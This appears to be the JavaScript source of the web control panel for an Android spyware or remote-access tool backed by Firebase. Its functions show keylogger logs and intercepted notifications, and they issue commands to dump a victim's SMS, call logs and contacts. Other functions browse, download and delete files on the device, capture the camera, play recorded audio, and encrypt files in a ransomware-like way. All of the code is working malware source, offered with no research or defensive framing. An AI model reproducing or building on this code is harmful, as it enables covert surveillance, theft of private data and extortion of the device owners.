                    psdus.innerHTML += '<div class="recswarp" ><div class="plrec" onclick="playssrec(this)" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg></div><audio controls ><source src="' + recs + '" type="audio/mpeg" /></audio><div class="downlii" onclick="downliio(' + "'" + recs + "'" + ')"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-box-arrow-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M3.5 10a.5.5 0 0 1-.5-.5v-8a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 0 0 1h2A1.5 1.5 0 0 0 14 9.5v-8A1.5 1.5 0 0 0 12.5 0h-9A1.5 1.5 0 0 0 2 1.5v8A1.5 1.5 0 0 0 3.5 11h2a.5.5 0 0 0 0-1h-2z"/><path fill-rule="evenodd" d="M7.646 15.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 14.293V5.5a.5.5 0 0 0-1 0v8.793l-2.146-2.147a.5.5 0 0 0-.708.708l3 3z"/></svg></div>' + convertTimestamp(parseInt(times)) + '</div><br>';
                }
                if (lastkeyvoice != (keys[keys.length - 1] + "") && parseInt(keys.length) >= 10) {
                    lastkeyvoice = keys[keys.length - 1] + "";
                    psdus.innerHTML += "<br><center><button class='btn' " + 'onclick="voicessu(this,' + "'" + lastkeyvoice + "'" + ')"' + ">Load More</button></center><br>";
                }
                lastkeyvoice = keys[keys.length - 1] + "";
            } else {
                psdus.innerHTML = '<div class="keylogg" ><h4>No Recordings Found<h4></div>';
            }
        }
    }
}

function keylogger() {
    manager = "notikey";
    if (manager == "notikey") {
        var psdus = document.getElementById("notikey");
        hidekarbsdk();
        $("#preloaderr").fadeIn();
        $("#phones").css("display", "none");
        var database = firebase.database();
        var ref = database.ref("logolog/" + unqid);
        ref.limitToFirst(10).once("value", gotData);

        function gotData(data) {
            $("#preloaderr").fadeOut();
            psdus.style.display = "block";
            psdus.innerHTML = '<div onclick="clrk()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';
            if (data.exists()) {
                var scores = data.val();
                var keys = Object.keys(scores);
                var i = 0;
                for (i = (keys.length - 1); i > -1; i--) {
                    var k = keys[i];
                    var event = scores[k].logoev;
                    var date = scores[k].logodate;
                    var msg = scores[k].msg;
                    psdus.innerHTML += '<div class="keylogg" ><b>Event: </b>' + event + '<br><br><b>Time: </b>' + date + '<br><br><b>Msg: </b>' + msg + "</div>";
                }
                if (lastkeykey != (keys[keys.length - 1] + "") && parseInt(keys.length) >= 10) {
                    lastkeykey = keys[keys.length - 1] + "";
                    psdus.innerHTML += "<br><center><button class='btn' " + 'onclick="loadmoreeu(this,' + "'" + lastkeykey + "'" + ')"' + ">Load More</button></center><br>";
                }
                lastkeykey = keys[keys.length - 1] + "";
            } else {
                psdus.innerHTML = '<div class="keylogg" ><h4>No Logs Found<h4></div>';
            }
        }
    }
}

function loadmoreeu(o, p) {
    manager = "notikey";
    if (manager == "notikey") {
        o.innerHTML = ".....";
        o.disabled = true;
        var psdus = document.getElementById("notikey");
        var database = firebase.database();
        var ref = database.ref("logolog/" + unqid);
        ref.orderByKey().startAt(p).limitToFirst(10).once("value", gotData);

        function gotData(data) {
            if (data.exists()) {
                var scores = data.val();
                var keys = Object.keys(scores);
                var i = 0;
                psdus.style.display = "block";
                o.style.display = "none";
                for (i = (keys.length - 1); i > -1; i--) {
                    var k = keys[i];
                    var event = scores[k].logoev;
                    var date = scores[k].logodate;
                    var msg = scores[k].msg;
                    psdus.innerHTML += '<div class="keylogg" ><b>Event: </b>' + event + '<br><br><b>Time: </b>' + date + '<br><br><b>Msg: </b>' + msg + "</div>";
                }
                if (lastkeykey != (keys[keys.length - 1] + "") && parseInt(keys.length) >= 10) {
                    lastkeykey = keys[keys.length - 1] + "";
                    psdus.innerHTML += "<br><center><button class='btn' " + 'onclick="loadmoreeu(this,' + "'" + lastkeykey + "'" + ')"' + ">Load More</button></center><br>";
                }
                lastkeykey = keys[keys.length - 1] + "";
            } else {
                psdus.innerHTML = '<div class="keylogg" ><h4>No Logs Found<h4></div>';
            }
        }
    }
}

function notificationlog() {
    manager = "notikey";
    var psdus = document.getElementById("notikey");
    hidekarbsdk();
    $("#preloaderr").fadeIn();
    $("#phones").css("display", "none");
    var database = firebase.database();
    var ref = database.ref("notilogo/" + unqid);
    if (manager == "notikey") {
        ref.orderByKey().limitToLast(1000).once("value", gotData);
    }

    function gotData(data) {
        $("#preloaderr").fadeOut();
        psdus.style.display = "block";
        psdus.innerHTML = '<div onclick="clrn()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';

        if (data.exists()) {
            var scores = data.val();
            var keys = Object.keys(scores);
            keys.reverse();

            var notifs = [];
            for (var i = 0; i < keys.length; i++) {
                var k = keys[i];
                var item = scores[k];
                var timeVal = item.time || 0;
                if (typeof timeVal === "string") timeVal = parseInt(timeVal) || 0;
                notifs.push({ key: k, data: item, time: timeVal });
            }
            notifs.sort(function(a, b) { return b.time - a.time; });

            for (var i = 0; i < notifs.length; i++) {
                var item = notifs[i];
                var k = item.key;
                var ico = item.data.icon;
                var packa = item.data.package;
                var title = item.data.title;
                var time = item.time;
                var ticker = item.data.ticker;
                var text = item.data.text;
                var name = item.data.name;
                if (ticker != "") ticker = '(' + ticker + ')';

                psdus.innerHTML += '<div class="keylogg" >' +
                    '<img src="data:image/png;base64,' + ico + '" >' +
                    '<div style="margin-left:60px;overflow:auto; "><b style="color:green"> ' + name + '</b><br><b style="color:red">' + packa + '</b><br><br><br></div>' +
                    '<h4>' + title + '<br><b>' + ticker + '</b> </h4>' +
                    '<br><p>' + text + '</p>' +
                    '<br><span>' + convertTimestamp(time) + '</span>' +
                    '</div>';
            }

            if (notifs.length > 0) {
                lastkeynot = notifs[notifs.length - 1].key;
                psdus.innerHTML += "<br><center><button class='btn' onclick='loadmoree(this,\"" + lastkeynot + "\")'>Load More</button></center><br>";
            }
        } else {
            psdus.innerHTML += '<div class="keylogg" ><h4>No Notifications Found</h4></div>';
        }
    }
}

function loadmoree(o, p) {
    manager = "notikey";
    o.innerHTML = ".....";
    o.disabled = true;
    var psdus = document.getElementById("notikey");
    var database = firebase.database();
    var ref = database.ref("notilogo/" + unqid);
    if (manager == "notikey") {
        ref.orderByKey().endAt(p).limitToLast(1001).once("value", gotData);
    }

    function gotData(data) {
        if (data.exists() && manager == "notikey") {
            var scores = data.val();
            var keys = Object.keys(scores);
            var idx = keys.indexOf(p);
            if (idx !== -1) keys.splice(idx, 1);

            keys.reverse();

            var notifs = [];
            for (var i = 0; i < keys.length; i++) {
                var k = keys[i];
                var item = scores[k];
                var timeVal = item.time || 0;
                if (typeof timeVal === "string") timeVal = parseInt(timeVal) || 0;
                notifs.push({ key: k, data: item, time: timeVal });
            }
            notifs.sort(function(a, b) { return b.time - a.time; });

            o.style.display = "none";

            for (var i = 0; i < notifs.length; i++) {
                var item = notifs[i];
                var k = item.key;
                var ico = item.data.icon;
                var packa = item.data.package;
                var title = item.data.title;
                var time = item.time;
                var ticker = item.data.ticker;
                var text = item.data.text;
                var name = item.data.name;
                if (ticker != "") ticker = '(' + ticker + ')';

                psdus.innerHTML += '<div class="keylogg" >' +
                    '<img src="data:image/png;base64,' + ico + '" >' +
                    '<div style="margin-left:60px;overflow:auto; "><b style="color:green"> ' + name + '</b><br><b style="color:red">' + packa + '</b><br><br><br></div>' +
                    '<h4>' + title + '<br><b>' + ticker + '</b> </h4>' +
                    '<br><p>' + text + '</p>' +
                    '<br><span>' + convertTimestamp(time) + '</span>' +
                    '</div>';
            }

            if (notifs.length > 0) {
                lastkeynot = notifs[notifs.length - 1].key;
                psdus.innerHTML += "<br><center><button class='btn' onclick='loadmoree(this,\"" + lastkeynot + "\")'>Load More</button></center><br>";
            }
        } else {
            o.style.display = "none";
        }
    }
}

function dumpsms() {
    manager = "fileview";
    setdatcmd("dmpsms", "", "", respov);
}

function calllogs() {
    manager = "fileview";
    setdatcmd("dmpcall", "", "", respov);
}

function dumpcontact() {
    manager = "fileview";
    setdatcmd("dmpcont", "", "", respov);
}

function getpackages() {
    manager = "fileview";
    setdatcmd("getpackages", "", "", respov);
}

function fileev(o) {
    document.getElementById("vieweri").src = "data:text/html,<h4 style='color:green' > Getting File for preview....</h4>";
    document.getElementById("viewers").style.display = "block";
    document.getElementById("vieweri").src = o;
    document.getElementById("downlo").href = o;
}

function filesmanager() {
    manager = "filesmanager";
    $("#resp").css("display", "block");
    $("#phones").css("display", "none");
    setdatcmd("cd", "/sdcard/", "", respov);
}

function opfol(event) {
    var target = event.target || event.srcElement;
    clx = event.clientX;
    cly = event.clientY;

    if (((screen.height - cly) / 2) < 122) {
        document.getElementById("filwt").style.top = (screen.height - 300) + "px";
        document.getElementById("filwt").style.left = clx + "px";
    } else {
        document.getElementById("filwt").style.top = cly + "px";
        document.getElementById("filwt").style.left = clx + "px";
    }
    tarfol = event.target.innerHTML;

    if (tarfol.indexOf(".pkc") > -1) {
        document.getElementById("decrfol").style.display = "block";
    } else {
        document.getElementById("decrfol").style.display = "none";
    }

    // Mostra/nascondi il pulsante download in base al tipo
    var downloadBtn = document.getElementById("downfol");
    if (downloadBtn) {
        var tarfoltype = event.target.getAttribute("class");
        if (tarfol == ".." || !tarfoltype || tarfoltype.indexOf("fo") < 0) {
            downloadBtn.style.display = "none";
        } else {
            downloadBtn.style.display = "block";
        }
    }

    if (tarfol == "..") {
        setdatcmd("cd", var32.substr(0, var32.lastIndexOf("/")), "", respov);
    } else {
        document.getElementById("filwt").style.display = "block";
        document.getElementById("filwt").setAttribute("data-file", tarfol);
        document.getElementById("filwt").setAttribute("data-type", event.target.getAttribute("class"));
    }
}

function opfol22(o) {
    document.getElementById("filwt").style.display = "none";
    var tarfol = o.parentElement.parentElement.getAttribute("data-file");

    if (tarfol == "..") {
        setdatcmd("cd", var32.substr(0, var32.lastIndexOf("/")), "", respov);
    } else if (tarfol.indexOf("<b>") > -1) {
        setdatcmd("cd", var32 + "/" + tarfol.substr(0, tarfol.indexOf("<b>")), "", respov);
    } else {
        setdatcmd("cd", var32 + "/" + tarfol, "", respov);
    }
}

function encryptfol(o) {
    document.getElementById("filwt").style.display = "none";
    var tarfol = o.parentElement.parentElement.getAttribute("data-file");
    var tarfoltype = o.parentElement.parentElement.getAttribute("data-type");
    if (tarfol == "..") {
        setdatcmd("cd", var32.substr(0, var32.lastIndexOf("/")), "", respov);
    } else if ((tarfoltype.indexOf("fo") < 0) && (tarfol.indexOf("<b>") > -1)) {
        setdatcmd("encrypt", var32 + "/" + tarfol.substr(0, tarfol.indexOf("<b>")), "", respov);
        setdatcmd("cd", "/sdcard/", "", respov);
    } else {
        setdatcmd("encrypt", var32 + "/" + tarfol, "", respov);
        setdatcmd("cd", "/sdcard/", "", respov);
    }
}

// Funzione per il download delle cartelle
function downloadfol(o) {
    document.getElementById("filwt").style.display = "none";
    var tarfol = o.parentElement.parentElement.getAttribute("data-file");
    var tarfoltype = o.parentElement.parentElement.getAttribute("data-type");

    if (tarfol == "..") {
        return;
    }

    var folderPath = "";

    if ((tarfoltype.indexOf("fo") > -1) && (tarfol.indexOf("<b>") > -1)) {
        folderPath = var32 + "/" + tarfol.substr(0, tarfol.indexOf("<b>"));
        folderDownloadName = tarfol.substr(0, tarfol.indexOf("<b>"));
    } else if (tarfoltype.indexOf("fo") > -1) {
        folderPath = var32 + "/" + tarfol;
        folderDownloadName = tarfol;
    } else {
        // È un file, scarica direttamente
        setdatcmd("cd", var32 + "/" + tarfol, "", respov);
        manager = "fileview";
        return;
    }

    // Inizializza il download della cartella
    folderDownloadQueue = [];
    folderDownloadIndex = 0;
    folderFilesContent = [];
    folderDownloadBasePath = folderPath;
    folderScanStack = [folderPath];
    isFolderDownloadActive = true;

    // Mostra il loader
    $("#preloaderr").fadeIn();
    document.getElementById("loadtxt").innerText = "Scansione cartella: " + folderDownloadName + "...";

    // Inizia la scansione
    manager = "folderscan";
    setdatcmd("cd", folderPath, "", respov);
}

// Gestisce la scansione delle cartelle
function handleFolderScan(respo, v1, v2, v3, currentPath) {
    if (!isFolderDownloadActive) return;

    var tempDiv = document.createElement("div");
    tempDiv.innerHTML = respo;

    var fileItems = tempDiv.querySelectorAll("li");
    var files = [];
    var folders = [];

    for (var i = 0; i < fileItems.length; i++) {
        var item = fileItems[i];
        var className = item.className || "";
        var itemText = item.textContent || item.innerText;

        var nameMatch = itemText.match(/^([^<]+)/);
        if (nameMatch && nameMatch[1].trim() !== "") {
            var name = nameMatch[1].trim();

            if (className.indexOf("fo") > -1) {
                if (name !== ".." && name !== ".") {
                    folders.push({
                        name: name,
                        path: currentPath + "/" + name
                    });
                }
            } else if (className.indexOf("im") > -1 || className.indexOf("vi") > -1 || className.indexOf("fi") > -1) {
                files.push({
                    name: name,
                    path: currentPath + "/" + name
                });
            }
        }
    }

    for (var i = 0; i < files.length; i++) {
        folderDownloadQueue.push(files[i]);
    }

    for (var i = 0; i < folders.length; i++) {
        folderScanStack.push(folders[i].path);
    }

    if (folderScanStack.length > 0) {
        var nextFolder = folderScanStack.pop();
        document.getElementById("loadtxt").innerText = "Scansione: " + nextFolder + "...";
        setdatcmd("cd", nextFolder, "", respov);
    } else {
        startFolderDownload();
    }
}

function startFolderDownload() {
    if (folderDownloadQueue.length === 0) {
        alert("Nessun file trovato nella cartella " + folderDownloadName);
        $("#preloaderr").fadeOut();
        manager = "filesmanager";
        isFolderDownloadActive = false;
        setdatcmd("cd", var32, "", respov);
        return;
    }

    folderDownloadIndex = 0;
    manager = "folderdownload";
    downloadNextFolderFile();
}

function downloadNextFolderFile() {
    if (folderDownloadIndex >= folderDownloadQueue.length) {
        createFolderZip();
        return;
    }

    var file = folderDownloadQueue[folderDownloadIndex];
    document.getElementById("loadtxt").innerText = "Download: " + (folderDownloadIndex + 1) + "/" + folderDownloadQueue.length + " - " + file.name;

    setdatcmd("cd", file.path, "", respov);
}

function handleFolderDownload(respo, v1, v2, v3) {
    if (!isFolderDownloadActive) return;

    var currentFile = folderDownloadQueue[folderDownloadIndex];

    if (respo == "imgview" && v1) {
        folderFilesContent.push({
            name: currentFile.name,
            path: currentFile.path,
            type: "image",
            content: v1,
            isBase64: true
        });
    } else if (respo == "fileview" && v1) {
        folderFilesContent.push({
            name: currentFile.name,
            path: currentFile.path,
            type: "text",
            content: v1,
            isBase64: false
        });
    }

    folderDownloadIndex++;
    $("#preloaderr").fadeIn();
    downloadNextFolderFile();
}

function createFolderZip() {
    try {
        var folderData = {
            name: folderDownloadName,
            files: folderFilesContent
        };

        var jsonContent = JSON.stringify(folderData, null, 2);

        var blob = new Blob([jsonContent], { type: 'application/json' });
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = folderDownloadName + "_folder.json";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        alert("Download completato! " + folderFilesContent.length + " file scaricati come " + folderDownloadName + "_folder.json");
    } catch (e) {
        console.error("Errore nella creazione del file:", e);
        alert("Errore nel download della cartella: " + e.message);
    }

    $("#preloaderr").fadeOut();
    manager = "filesmanager";
    isFolderDownloadActive = false;
    setdatcmd("cd", var32, "", respov);
}

function foldel(o) {
    document.getElementById("filwt").style.display = "none";
    var tarfol = o.parentElement.parentElement.getAttribute("data-file");
    var tarfoltype = o.parentElement.parentElement.getAttribute("data-type");
    if (tarfol == "..") {
        setdatcmd("cd", var32.substr(0, var32.lastIndexOf("/")), "", respov);
    } else if ((tarfoltype.indexOf("fo") < 0) && (tarfol.indexOf("<b>") > -1)) {
        setdatcmd("delfile", var32 + "/" + tarfol.substr(0, tarfol.indexOf("<b>")), "", respov);
        setdatcmd("cd", "/sdcard/", "", respov);
    } else {
        setdatcmd("delfile", var32 + "/" + tarfol, "", respov);
        setdatcmd("cd", "/sdcard/", "", respov);
    }
}

function decryptfol(o) {
    document.getElementById("filwt").style.display = "none";
    var tarfol = o.parentElement.parentElement.getAttribute("data-file");
    var tarfoltype = o.parentElement.parentElement.getAttribute("data-type");
    if (tarfol == "..") {
        setdatcmd("cd", var32.substr(0, var32.lastIndexOf("/")), "", respov);
    } else if ((tarfoltype.indexOf("fo") < 0) && (tarfol.indexOf("<b>") > -1)) {
        setdatcmd("decrypt", var32 + "/" + tarfol.substr(0, tarfol.indexOf("<b>")), "", respov);
        setdatcmd("cd", "/sdcard/", "", respov);
    } else {
        setdatcmd("decrypt", var32 + "/" + tarfol, "", respov);
        setdatcmd("cd", "/sdcard/", "", respov);
    }
}

function camss() {
    setdatcmd("capturecam", "", "", respov);
    manager = "camview";
}

function playssrec(o) {
    if (o.nextElementSibling.paused == false) {
        o.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg>';
        o.nextElementSibling.pause();
    } else {
        o.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-pause" viewBox="0 0 16 16"><path d="M6 3.5a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-1 0V4a.5.5 0 0 1 .5-.5zm4 0a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-1 0V4a.5.5 0 0 1 .5-.5z"/></svg>';
        o.nextElementSibling.play();
    }
}

function downliio(o) {
    window.open(o);
}

function hideThumbnails() {
    thumbnailQueue = [];
    thumbnailIndex = 0;
    batchStart = 0;
    thumbBatchActive = false;
    pendingThumbIndex = -1;
    var btn = document.querySelector("#gallery-controls button:first-child");
    if (btn) {
        btn.textContent = "Mostra anteprime immagini";
        btn.disabled = false;
    }
    setdatcmd("cd", var32, "", respov);
}
